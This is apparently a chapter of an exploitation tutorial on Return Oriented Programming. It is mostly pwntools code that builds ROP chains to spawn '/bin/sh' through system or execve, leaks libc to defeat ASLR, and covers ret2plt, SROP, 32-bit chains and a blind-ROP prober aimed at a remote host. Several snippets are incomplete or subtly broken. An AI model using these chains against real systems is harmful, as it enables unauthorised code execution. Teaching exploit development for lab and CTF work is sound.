# ROP (Return Oriented Programming)

Return Oriented Programming (ROP) is an advanced exploitation technique that chains together small instruction sequences called "gadgets" to bypass modern security mitigations like DEP/NX bit.

## Introduction to ROP

### What is ROP?

ROP reuses existing code in the target binary to perform arbitrary computations:

- **Gadgets**: Short instruction sequences ending in `ret`
- **Chain**: Sequence of gadget addresses on the stack
- **Execution**: Each `ret` instruction jumps to the next gadget
- **Bypass**: Circumvents DEP/NX by using existing executable code

### Why ROP is Needed

Modern protections that ROP helps bypass:

```
DEP/NX Bit: Prevents execution of stack/heap data
ASLR: Randomizes memory layout
Stack Canaries: Detect stack buffer overflows
```

### ROP vs Traditional Exploitation

| Traditional | ROP |
|-------------|-----|
| Inject shellcode | Reuse existing code |
| Execute stack data | Execute .text section |
| Blocked by DEP | Bypasses DEP |
| Simple payload | Complex chain |

## ROP Gadgets

### Basic Gadget Types

```asm
; Data movement gadgets
pop rax; ret          ; Load value from stack into RAX
pop rdi; ret          ; Load first function argument
mov [rax], rbx; ret   ; Store RBX at address in RAX

; Arithmetic gadgets  
add rax, rbx; ret     ; Add RBX to RAX
xor rax, rax; ret     ; Zero out RAX
inc rax; ret          ; Increment RAX

; Control flow gadgets
jmp rax               ; Jump to address in RAX
call rax              ; Call function at address in RAX
```

### Finding Gadgets

#### Using ROPgadget

```bash
# Install ROPgadget
pip install ropgadget

# Find all gadgets
ROPgadget --binary ./target

# Find specific gadgets
ROPgadget --binary ./target --only "pop|ret"
ROPgadget --binary ./target --string "/bin/sh"
ROPgadget --binary ./target --opcode "syscall"

# Advanced filtering
ROPgadget --binary ./target --depth 5
ROPgadget --binary ./target --badbytes "00|0a|0d"
```

#### Using pwntools

```python
from pwn import *

elf = ELF('./target')
rop = ROP(elf)

# Find specific gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Search for strings
bin_sh = next(elf.search(b'/bin/sh'))

print(f"pop rdi; ret: 0x{pop_rdi:x}")
print(f"/bin/sh: 0x{bin_sh:x}")
```

#### Manual Gadget Search

```python
#!/usr/bin/env python3
from pwn import *

def find_gadgets_manual(binary_path):
    with open(binary_path, 'rb') as f:
        binary = f.read()
    
    # Search for RET instruction (0xc3)
    ret_gadgets = []
    
    for i in range(len(binary)):
        if binary[i] == 0xc3:  # RET instruction
            # Look backwards for useful instructions
            for j in range(1, 10):  # Check up to 10 bytes back
                if i - j < 0:
                    break
                
                # Check for pop rdi (0x5f)
                if binary[i-j] == 0x5f:
                    gadget_addr = 0x400000 + (i - j)  # Adjust base address
                    ret_gadgets.append(('pop rdi; ret', gadget_addr))
    
    return ret_gadgets

gadgets = find_gadgets_manual('./target')
for name, addr in gadgets:
    print(f"{name}: 0x{addr:x}")
```

## Basic ROP Chains

### Simple Function Call

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('./target')

def basic_rop_chain():
    # Find gadgets
    pop_rdi = 0x400123  # pop rdi; ret
    system_addr = elf.plt['system']
    bin_sh = next(elf.search(b'/bin/sh'))
    
    # Build ROP chain
    rop_chain = [
        pop_rdi,      # Gadget to set RDI
        bin_sh,       # Argument: "/bin/sh"
        system_addr   # Call system()
    ]
    
    # Create payload
    offset = 72
    payload = b'A' * offset
    
    for addr in rop_chain:
        payload += p64(addr)
    
    return payload
```

### Multi-argument Function Call

```python
#!/usr/bin/env python3
from pwn import *

def multi_arg_rop():
    # For execve("/bin/sh", NULL, NULL)
    # Need: RDI = "/bin/sh", RSI = NULL, RDX = NULL
    
    pop_rdi = 0x400123    # pop rdi; ret
    pop_rsi_r15 = 0x400124  # pop rsi; pop r15; ret  
    pop_rdx = 0x400125    # pop rdx; ret
    
    rop_chain = [
        pop_rdi,
        bin_sh_addr,      # RDI = "/bin/sh"
        
        pop_rsi_r15,
        0x0,              # RSI = NULL
        0x0,              # R15 = dummy value
        
        pop_rdx,
        0x0,              # RDX = NULL
        
        execve_addr       # Call execve()
    ]
    
    return b'A' * 72 + b''.join(p64(addr) for addr in rop_chain)
```

## Advanced ROP Techniques

### Stack Pivoting

When buffer is too small for full ROP chain:

```python
#!/usr/bin/env python3
from pwn import *

def stack_pivot_rop():
    # Small buffer overflow
    # Use stack pivot to larger controlled area
    
    xchg_eax_esp = 0x400567  # xchg eax, esp; ret
    pop_eax = 0x400123       # pop eax; ret
    
    # Stage 1: Pivot stack to heap/bss
    pivot_addr = 0x601000    # Writable memory area
    
    stage1 = [
        pop_eax,
        pivot_addr,
        xchg_eax_esp  # ESP = pivot_addr
    ]
    
    # Stage 2: Full ROP chain at pivot location
    stage2 = build_full_rop_chain()
    
    # Write stage2 to pivot location first
    write_to_memory(pivot_addr, stage2)
    
    # Trigger overflow with stage1
    payload = b'A' * 32 + b''.join(p64(addr) for addr in stage1)
    
    return payload
```

### ROP Chain Generator

```python
#!/usr/bin/env python3
from pwn import *

class ROPBuilder:
    def __init__(self, binary_path):
        self.elf = ELF(binary_path)
        self.rop = ROP(self.elf)
        self.chain = []
    
    def set_register(self, reg, value):
        """Set register to specific value"""
        if reg == 'rdi':
            gadget = self.rop.find_gadget(['pop rdi', 'ret'])[0]
        elif reg == 'rsi':
            gadget = self.rop.find_gadget(['pop rsi', 'ret'])[0]
        elif reg == 'rdx':
            gadget = self.rop.find_gadget(['pop rdx', 'ret'])[0]
        else:
            raise ValueError(f"Unsupported register: {reg}")
        
        self.chain.extend([gadget, value])
    
    def call_function(self, func_addr):
        """Call function with current register state"""
        self.chain.append(func_addr)
    
    def write_memory(self, addr, value):
        """Write value to memory address"""
        # pop rax; ret
        pop_rax = self.rop.find_gadget(['pop rax', 'ret'])[0]
        # pop rbx; ret  
        pop_rbx = self.rop.find_gadget(['pop rbx', 'ret'])[0]
        # mov [rax], rbx; ret
        mov_gadget = self.rop.find_gadget(['mov qword ptr [rax], rbx', 'ret'])[0]
        
        self.chain.extend([
            pop_rax, addr,
            pop_rbx, value,
            mov_gadget
        ])
    
    def build_execve_chain(self, filename="/bin/sh"):
        """Build execve() system call"""
        # Find or create string
        try:
            str_addr = next(self.elf.search(filename.encode()))
        except StopIteration:
            # Need to write string to memory
            str_addr = 0x601000  # Writable section
            for i, char in enumerate(filename.encode() + b'\x00'):
                self.write_memory(str_addr + i, char)
        
        # Set up registers for execve
        self.set_register('rdi', str_addr)  # filename
        self.set_register('rsi', 0)         # argv = NULL
        self.set_register('rdx', 0)         # envp = NULL
        self.set_register('rax', 59)        # sys_execve
        
        # Find syscall gadget
        syscall = self.rop.find_gadget(['syscall'])[0]
        self.call_function(syscall)
    
    def get_chain(self):
        """Return the ROP chain as bytes"""
        return b''.join(p64(addr) for addr in self.chain)

# Usage
builder = ROPBuilder('./target')
builder.build_execve_chain()
rop_chain = builder.get_chain()
```

## Bypassing ASLR with ROP

### Information Leak + ROP

```python
#!/usr/bin/env python3
from pwn import *

def aslr_bypass_rop():
    p = process('./target')
    elf = ELF('./target')
    
    # Stage 1: Leak libc address
    pop_rdi = 0x400743
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.symbols['main']
    
    # ROP chain to leak puts address
    leak_chain = [
        pop_rdi,
        puts_got,     # puts(puts@got)
        puts_plt,
        main_addr     # Return to main for second exploit
    ]
    
    payload1 = b'A' * 72 + b''.join(p64(addr) for addr in leak_chain)
    p.sendline(payload1)
    
    # Parse leaked address
    leaked_puts = u64(p.recvline()[:6].ljust(8, b'\x00'))
    log.info(f"Leaked puts: 0x{leaked_puts:x}")
    
    # Calculate libc base
    libc = ELF('./libc.so.6')
    libc.address = leaked_puts - libc.symbols['puts']
    log.info(f"Libc base: 0x{libc.address:x}")
    
    # Stage 2: ROP to system with known addresses
    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    
    exploit_chain = [
        pop_rdi,
        bin_sh_addr,
        system_addr
    ]
    
    payload2 = b'A' * 72 + b''.join(p64(addr) for addr in exploit_chain)
    p.sendline(payload2)
    p.interactive()
```

### ret2plt Technique

```python
#!/usr/bin/env python3
from pwn import *

def ret2plt_exploit():
    """Use PLT entries to call libc functions"""
    elf = ELF('./target')
    
    # Use PLT entries (no ASLR on main binary)
    puts_plt = elf.plt['puts']
    read_plt = elf.plt['read'] 
    
    # Gadgets from main binary (no ASLR)
    pop_rdi = 0x400743
    pop_rsi_r15 = 0x400741
    pop_rdx = 0x400749
    
    # Writable memory in BSS
    bss_addr = elf.bss()
    
    # Chain: read("/bin/sh\x00", bss, 8) then system(bss)
    chain = [
        # read(0, bss, 8)
        pop_rdi, 0,           # stdin
        pop_rsi_r15, bss_addr, 0,  # buffer, dummy
        pop_rdx, 8,           # count
        read_plt,
        
        # system(bss)
        pop_rdi, bss_addr,
        elf.plt['system']
    ]
    
    payload = b'A' * 72 + b''.join(p64(addr) for addr in chain)
    
    p = process('./target')
    p.sendline(payload)
    p.sendline(b'/bin/sh\x00')  # Input for read()
    p.interactive()
```

## SROP (Sigreturn-oriented Programming)

### Sigreturn System Call

```python
#!/usr/bin/env python3
from pwn import *

def srop_exploit():
    """Use sigreturn to control all registers"""
    context.arch = 'amd64'
    
    # Find syscall gadget
    syscall_gadget = 0x400517  # syscall; ret
    
    # Create sigreturn frame
    frame = SigreturnFrame()
    frame.rax = 59          # sys_execve
    frame.rdi = 0x601000    # "/bin/sh" address
    frame.rsi = 0           # NULL
    frame.rdx = 0           # NULL
    frame.rip = syscall_gadget
    
    # ROP chain
    chain = [
        # Set RAX to 15 (sys_rt_sigreturn)
        pop_rax_gadget,
        15,
        syscall_gadget,     # sigreturn
        # Sigreturn frame follows
    ]
    
    payload = b'A' * 72
    payload += b''.join(p64(addr) for addr in chain)
    payload += bytes(frame)
    
    return payload
```

## 32-bit ROP Differences

### Calling Convention Differences

```python
#!/usr/bin/env python3
from pwn import *

def rop_32bit():
    """32-bit ROP uses stack for function arguments"""
    context.arch = 'i386'
    
    # 32-bit: arguments passed on stack
    # system(arg1) becomes:
    # [system_addr][return_addr][arg1]
    
    system_plt = 0x08048400
    bin_sh = 0x08049000
    exit_addr = 0x08048410
    
    chain = [
        system_plt,
        exit_addr,    # Return address from system
        bin_sh        # Argument to system
    ]
    
    payload = b'A' * 76 + b''.join(p32(addr) for addr in chain)
    return payload

def rop_32bit_multiple_args():
    """Multiple arguments in 32-bit"""
    # execve(filename, argv, envp)
    execve_addr = 0x08048500
    filename = 0x08049000
    
    chain = [
        execve_addr,
        0x41414141,   # Return address (dummy)
        filename,     # arg1: filename
        0x0,          # arg2: argv = NULL  
        0x0           # arg3: envp = NULL
    ]
    
    payload = b'A' * 76 + b''.join(p32(addr) for addr in chain)
    return payload
```

## ROP Chain Automation

### Using pwntools ROP class

```python
#!/usr/bin/env python3
from pwn import *

def automated_rop():
    context.arch = 'amd64'
    elf = ELF('./target')
    rop = ROP(elf)
    
    # Automatic ROP chain generation
    rop.call('puts', [elf.got['puts']])
    rop.call('main', [])
    
    print(rop.dump())
    
    # Get the chain
    payload = b'A' * 72 + rop.chain()
    
    return payload

def complex_automated_rop():
    """More complex automated ROP"""
    elf = ELF('./target')
    libc = ELF('./libc.so.6')
    rop = ROP([elf, libc])
    
    # Build complex chain
    rop.read(0, elf.bss(), 8)      # Read input
    rop.system(elf.bss())          # Execute input
    
    print(rop.dump())
    return rop.chain()
```

## ROP Debugging and Testing

### Debugging ROP Chains

```python
#!/usr/bin/env python3
from pwn import *

def debug_rop_chain():
    context.terminal = ['tmux', 'splitw', '-h']
    
    # Start with GDB
    p = gdb.debug('./target', '''
        set disassembly-flavor intel
        break *0x400743
        continue
    ''')
    
    # Build and send ROP chain
    chain = build_rop_chain()
    payload = b'A' * 72 + chain
    
    p.sendline(payload)
    p.interactive()

def validate_gadgets():
    """Verify gadgets work as expected"""
    elf = ELF('./target')
    
    # Test each gadget individually
    gadgets = [
        (0x400743, "pop rdi; ret"),
        (0x400741, "pop rsi; pop r15; ret"),
        (0x400517, "syscall; ret")
    ]
    
    for addr, desc in gadgets:
        print(f"Testing {desc} at 0x{addr:x}")
        
        # Disassemble to verify
        code = elf.read(addr, 10)
        disasm = disasm(code, arch='amd64')
        print(disasm)
```

### ROP Chain Visualization

```python
#!/usr/bin/env python3
from pwn import *

def visualize_rop_chain(chain_data):
    """Visualize ROP chain structure"""
    print("ROP Chain Visualization:")
    print("=" * 50)
    
    offset = 0
    for i in range(0, len(chain_data), 8):
        addr = u64(chain_data[i:i+8])
        print(f"Stack[{offset:2d}]: 0x{addr:016x}")
        
        # Try to identify what this address points to
        try:
            elf = ELF('./target')
            if addr in elf.symbols.values():
                for name, sym_addr in elf.symbols.items():
                    if sym_addr == addr:
                        print(f"           ^ {name}")
                        break
        except:
            pass
        
        offset += 8

def test_rop_step_by_step():
    """Test ROP chain one gadget at a time"""
    base_payload = b'A' * 72
    
    # Test each step
    steps = [
        (pop_rdi, "pop rdi; ret"),
        (bin_sh_addr, "/bin/sh string"),
        (system_addr, "system() call")
    ]
    
    for i, (addr, desc) in enumerate(steps):
        print(f"Testing step {i+1}: {desc}")
        
        partial_chain = b''.join(p64(a) for a, _ in steps[:i+2])
        payload = base_payload + partial_chain
        
        # Test with timeout
        try:
            p = process('./target', timeout=2)
            p.sendline(payload)
            output = p.recvall()
            print(f"  Result: {output[:50]}...")
        except:
            print(f"  Step {i+1} failed or timed out")
        finally:
            if 'p' in locals():
                p.close()
```

## Advanced ROP Mitigation Bypasses

### JOP (Jump-oriented Programming)

```python
#!/usr/bin/env python3
from pwn import *

def jop_chain():
    """Use JMP/CALL gadgets instead of RET"""
    
    # JOP uses indirect jumps/calls
    # Gadgets end with jmp [reg] or call [reg]
    
    jmp_rax = 0x400123    # jmp rax
    pop_rax = 0x400124    # pop rax; ret
    
    # JOP dispatcher - cycles through gadgets
    dispatcher = jmp_rax
    
    # Virtual registers on stack/memory
    virtual_regs = {
        'vrax': 0x601000,
        'vrbx': 0x601008,
        'vrcx': 0x601010
    }
    
    # JOP chain uses memory-based execution
    # More complex than ROP but can bypass some mitigations
```

### Blind ROP (BROP)

```python
#!/usr/bin/env python3
from pwn import *

def blind_rop_discovery():
    """Discover gadgets without access to binary"""
    
    def test_crash(payload):
        """Test if payload causes crash"""
        try:
            p = remote('target.com', 1337)
            p.sendline(payload)
            response = p.recvall(timeout=2)
            p.close()
            return b"error" not in response.lower()
        except:
            return False
    
    # Find buffer overflow offset
    offset = 0
    for i in range(100, 200):
        if not test_crash(b'A' * i):
            offset = i
            break
    
    print(f"Crash offset: {offset}")
    
    # Find stop gadgets (prevent crash)
    stop_gadgets = []
    for addr in range(0x400000, 0x401000, 0x10):
        payload = b'A' * offset + p64(addr) * 10
        if test_crash(payload):
            stop_gadgets.append(addr)
            print(f"Stop gadget found: 0x{addr:x}")
    
    # Find useful gadgets using stop gadgets
    return stop_gadgets
```

## Key Takeaways

!!! important "ROP Fundamentals"
    - **Gadgets are code reuse** - Short sequences ending in RET
    - **Chain execution** - Each RET jumps to next gadget address
    - **DEP bypass** - Uses existing executable code
    - **ASLR challenges** - Need information leaks for dynamic libraries
    - **Architecture matters** - x86 vs x64 have different calling conventions

!!! tip "ROP Development Process"
    - Start with simple function calls (system, execve)
    - Use automated tools (ROPgadget, pwntools) for gadget discovery
    - Test gadgets individually before building full chains
    - Handle ASLR with information leaks or ret2plt
    - Debug chains step-by-step when they fail

!!! warning "Common ROP Pitfalls"
    - Misaligned stack causing crashes
    - Incorrect calling conventions for target architecture  
    - Forgetting about stack canaries in ROP chain location
    - ASLR breaking hardcoded addresses
    - Gadgets that modify unexpected registers

---

*Next: [Heap Exploitation](02-heap.md)*
